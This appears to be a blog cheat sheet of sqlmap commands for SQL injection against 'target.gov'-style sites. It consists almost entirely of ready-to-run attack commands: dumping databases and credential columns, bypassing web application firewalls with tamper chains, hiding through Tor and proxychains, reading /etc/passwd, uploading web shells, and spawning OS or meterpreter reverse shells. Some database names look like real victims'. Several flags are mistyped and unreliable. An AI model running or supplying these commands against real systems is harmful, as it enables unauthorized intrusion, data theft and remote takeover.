---
title: "SqlMap Cheat Sheet"
date: 2022-08-29 23:00:00 +07:00
categories: [CheatSheet]
tags: [Cheat Sheet, WriteUps]
image: 
---

# SQLmap Special Command       

# 1. BASIC COMMAND SQLMAP
```
- sqlmap -u "target.gov" --dbs --batch

- sqlmap -u "target.gov" -D ( name database ) --columns --batch

- sqlmap -u "target.gov" -D ( name database ) -T ( name table ) --columns --batch 

- sqlmap -u "target.gov" -D ( name database ) -T ( name table ) -C ( name column ) --dump --batch
```

# 2. WAF BYPASS TYPE
## all bypass waf forbidden
```
- sqlmap -u "target.gov" --level 5 --dbs --random-agent -v 3 
```

## waf bypass using tamper script
```
- sqlmap -u "target.gov" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs --batch
 
- sqlmap -u "target.gov" --identify-waf --random-agent -v 3 --dbs --batch

- sqlmap -u "target.gov" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs --batch

- sqlmap -u "target.gov/login" --data="userid=admin&passwd=admin" --method POST --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs --batch

- sqlmap -u "target.gov" --level=5 --skip-waf --dbs --batch

- sqlmap -u "target.gov" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs

- sqlmap -u "target.gov" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs --batch

- sqlmap -u "target.gov" --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs --batch

- sqlmap -u "target.gov" -v3 --technique=T --no-cast --fresh-queries --banner --dbs --batch

- sqlmap -u "target.gov" --level 2 --risk 3 --batch --dbs

- sqlmap -u "target.gov" -f -b --current-user --current-db --is-dba --users --dbs --batch

- sqlmap -u "target.gov" --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs --batch

- sqlmap -u "target.gov" --risk 3 --level 5 --random-agent --proxy http://127.0.0.1:5980 --dbs --batch

- sqlmap -u "target.gov" --random-agent --dbms=MYSQL --dbs --technique=B" --batch

- sqlmap -u "target.gov" --identify-waf --random-agent -v 3 --dbs --batch

- sqlmap -u "target.gov" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs --batch

- sqlmap -u "target.gov" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 --batch

- sqlmap -u "target.gov" --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump --batch

- sqlmap -u "target.gov" --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --

tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --batch

- sqlmap -u "target.gov" -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"

- sqlmap -u "target.gov" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 --batch

- sqlmap -u "target.gov" -v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --columns --batch

- sqlmap -u "target.gov" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --batch

- sqlmap -u "target.gov" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql --batch

- sqlmap -u "target.gov" --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -batch

- sqlmap -u "target.gov" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --batch

- sqlmap -u "target.gov" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" --batch

- sqlmap -u "target.gov:80/search.cmd?form_state=1" –level=5 –risk=3 -p ‘item1’ –tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --batch

-sqlmap -u "target.gov" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent --batch

- sqlmap -u "target.gov" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables --batch

- sqlmap -u "target.gov" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns --batch

- sqlmap -u "target.gov" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump --batch

- sqlmap -u "target.gov" tamper=between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percentage.py,randomcase.py,securesphere.py,sp_password.py,space2comment.py,space2dash.py,space2mssqlblank.py,space2mysqldash.py,space2plus.py,space2randomblank.py,unionalltounion.py,unmagicquotes.py --dbms=mssql --batcH                                                                                               
```

## bypass 403 forbidden
```
- sqlmap -u "target.gov" -v3 --dbms="MySql" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent --batch --dbs --no-cast --batch 
```

## bypass 403 Not Acceptable
```
- sqlmap -u "target.gov" --level 5 --dbs --random-agent -v 3 --batch 
```

##  bypass 500 internal server error 
```
--sqlmap -u "target.gov" --dbs --tamper=modsecurityzeroversioned -v 3 --batch 
```

## bypass waf dump table 500 internal server error
```
- sqlmap -u "target.gov"  --dbs --tamper=modsecurityzeroversioned,multiplespaces.py -v 3 --batch 
```

## bypass waf Mod Security
```
- sqlmap -u "target.gov" --random-agent --tamper=modsecurityversioned --level=3 --risk=3 -v 3 --dbs --batcH
```

# 3. SPECIAL COMMAND
## upload on header PUT
```
- sqlmap --method=PUT -u "target.gov" --headers="referer:*" --batch
```

## retrieve information
```
- sqlmap -u "target.gov" --users --passwords --privileges --roles --threads=10 --batch
```

## tajuk refferer
```
- sqlmap -u "target.gov" --headers="referer:*" --batch
```

## header injection to combination sql 
```
- sqlmap -u "target.gov" --headers="x-forwarded-for:127.0.0.1*" --batch
```

## injection in header and other HTTP method
```
> inside cookie 
- sqlmap  -u "target.gov" --cookie "mycookies=*" --batch

> inside some HEADER
- sqlmap -u "target.gov" --headers="x-forwarded-for:127.0.0.1*" --batch
- sqlmap -u "target.gov" --headers="referer:*" --batch

> PUT method
- sqlmap --method=PUT -u "target.gov" --headers="referer:*" --batch
```

## Verbose
```
- sqlmap -u "target.gov" -v 3 --batch
```

## indicate string when injection is successfully
```
- sqlmap -u "target.gov" --string="string_showed_when_TRUE" 
```

## scanning form 
```
- sqlmap -u "target.gov" -u "target.gov/admin/login.php" --form --dbs --batch
```

## force ssl/https
```
- sqlmap -r a.req --force-ssl --users --batch
```

## specifiy parameter save request file
```
- sqlmap -r login.req -p Password --dbms=mssql -v 3  --batch --level 5 --risk 3 --batch
```

## costumizing injection
```
> set a suffix injection
- sqlmap -u "target.gov/?id=1"  -p id --suffix="-- " --batch
> set a prefix injection
- sqlmap -u "target.gov/?id=1"  -p id --prefix="') " --batch
```

## second order injection
```
- sqlmap -r /tmp/r.txt --dbms MySQL --second-order "target.gov" -v 3 --batch
- sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs --batch
- sqlmap -r /root/Desktop/Burp.txt –second -order “target.gov” --batch
```

## running query sql
```
- sqlmap -u nz3666ghost.to/cat.php?id=2 –sql-shell --batch
```

## scanning page authentication HTTP ( Baci,NTLM,Digest )
```
- sqlmap -u http://example.com/admin.aspx –auth-type Basic –auth-cred “admin: admin” --batch
```

## scanning page key basic
```
- sqlmap -u http://example.com/admin.aspx - auth-file = < certificate PEM or Private key > --batch
```

## use network anonim TOR vpn
```
- sqlmap -u "target.gov/admin.aspx" –tor --batch
> set port tor
- sqlmap -u "target.gov/admin/aspx" –tor-port = <tor proxy port> --batch
```

## request delay HTTP 
```
- sqlmap -u "target.gov/admin.aspx" –delay = delay 1 # 1 second --batch
```

## protection page of token CSRF ( Crossite Request Forgery )
```
- sqlmap -u "target.gov/admin.aspx" –csrf-token = <csrf token> --batch
```

## finding boolean injection
```
- sqlmap -r r.txt -p id --not-string ridiculous --batch
```

## request injection
```
- sqlmap -u "target.gov/test.php?id=1" -p id --batch
- sqlmap -u "target.gov/test.php?id=1" * --batch
```

## injection from file 
```
- sqlmap -r request.txt --batch
```

## testing with pattern URL's
```
- sqlmap -u "target.gov/page/*/view" --dbs --batch
```

## using cookies
```
- sqlmap -u "target.gov/enter.php" --cookie="" -u "target.gov/index.php?id=1" --dbs --batch
```

## identify current database
```
- sqlmap -u "target.gov/page.php?id=1" --current-db --batch
```

## multi threading
```
- sqlmap -u "target.gov/page.php?id=1" --dbs --threads 5 --batch
```

## null connection
```
- sqlmap -u "target.gov/page.php?id=1" --dbs --null-connection --batch
```

## HTTP persistant connection
```
- sqlmap -u "target.gov/page.php?id=1" --dbs --keep-alive --batch
```

## output prediction
```
- sqlmap -u "target.gov/page.php?id=1" -D database -T user -c users,password --dump --predict-output --batch
```

## checking privilages
```
- sqlmap -u "target.gov/page.php?id=1" --privileges --batch
```

## reading file from server
```
- sqlmap -u "target.gov/page.php?id=1" --file-read=/etc/passwd --batch
```

## using proxxy
```
- sqlmap --proxy="127.0.0.1:8080" -u "target.gov/page.php?id=1" --dbs --batch
```

## using proxxy with credentials
```
- sqlmap -–proxy="127.0.0.1:8080" –-proxy-cred=username:password -u "target.gov/page.php?id=1" --batch
```

# 4. CRAWLING INJECTION
```
- sqlmap -u "target.gov" --crawl=1 --forms --dbs --batch

- sqlmap -u "target.gov" --crawal=10 --forms --dbs --batch

- sqlmap -u "target.gov" --crawl=2 --forms --dbs --batch

- sqlmap --threads 10 --batch --crawl 1 --forms -u "target.gov" --tamper space2comment --dbs --batch

- sqlmap -u "target.gov" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

- sqlmap -u "target.gov" –crawl = 3 –cookie = "" –crawl-exclude = "logout" --batch

- sqlmap -u "target.gov" --dbms=mysql --crawl=3 --batch

- sqlmap -u "<targetip>" --forms --batch --crawl=10 --cookie=jsessionid=54321 --level 4 --risk 3 --batch

- sqlmap -u "target.gov" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

# 5. SQL POST DATA
```
- sqlmap -u "target.gov" --data="email=omest&password=omest" --method POST --dbs --batch
```

# 6. PARAMETER INJECTION
```
- sqlmap -u "target.gov" --banner --dbs --batch
```

# 7. BURPSUITE/SANDROPROXXY > SQLMAP
```
> POST request
- sqlmap -r target.txt -p username --batch 
- sqlmap -r target.txt -p username --dump --batch

> capture request and create req.txt file
- sqlmap -r req.txt --current-user --batch

> GET request injection
- sqlmap -u "target.gov" -p id --batch
- sqlmap -u "http://example.com/?id=*" -p id --batch

> POST request injection
- sqlmap -u "target.gov" --data "username=*&password=*" --dbs --batch
```

# 8. SQLMAP OS SHELL
```
> basic operating system shell ( Linux )
- sqlmap -u "target.gov/leet.php?id=1337" --os-shell --batch  

> basic operating system command prompt ( Windows )
- sqlmap -u "target.gov/leet.php?id=1337" --os-cmd ( command windows ) --batch 

> simple shell
- sqlmap  -u "target.gov/?id=1" -p id --os-shell --batch 
 
> exec command os windows
- sqlmap -u "target.gov/?id=1" -p id --os-cmd whoami
 
> dropping reverse shell ( meterpreter )
- sqlmap -u "target.gov/?id=1" -p id --os-pwn --batch
--file-read=/etc/passwd ( read file )

> os uploading shell 
- sqlmap -u "target.gov/page.php?id=1" --file-write=path/shell.php --file-dest=path/shell.php --batch

> os write commad
- sqlmap -u "target.gov/page.php?id=1" --os-shell --batch
after successfully get OS shell
write some file, example 
echo "leet" >> haxor.txt

> os shell cookies injection and skipping waf 
- sqlmap -u "target.gov/pussy.php?cat=123" --threads=10 --cookie="cookies" --skip-waf --os-shell --batch
```

# 9. SQLMAP WITH PROXYCHAINS ( TOR )
```
> update and upgrade
- sudo apt-get update;sudo apt-get upgrade

> install proxychains & tor
- sudo apt-get purge proxychains;sudo apt-get purge  proxychains4;sudo apt-get purge tor
- sudo apt-get install proxychains4;sudo apt-get install proxychains;sudo apt-get install tor
- which proxychains;which proxychains4;which tor

> setting configuration proxychains using text editor terminal like nano,vim,micro  and etc
- micro /etc/proxychains.conf
WARNING !
listen 
delete hastag coment ( # ) in dynamic_chain, and add hastag coment ( # ) in strict_chain one more and delete hastag coment ( # ) in random_chain

add socks5 below socks4
example
socks4 127.0.0.1 9050
socks5 127.0.0.1 9050 ( here add new socks with socks5 like this )


fix line in hastag coment # proxylist format, example you just space line so that it is parallel
and then save file configuration

- start tor with command sudo service tor start
- check status tor active with command sudo service tor status


and last run sqlmap tool with proxychains

yp@syntax:~# proxychains sqlmap -u "target.gov" --dbs --batch
```
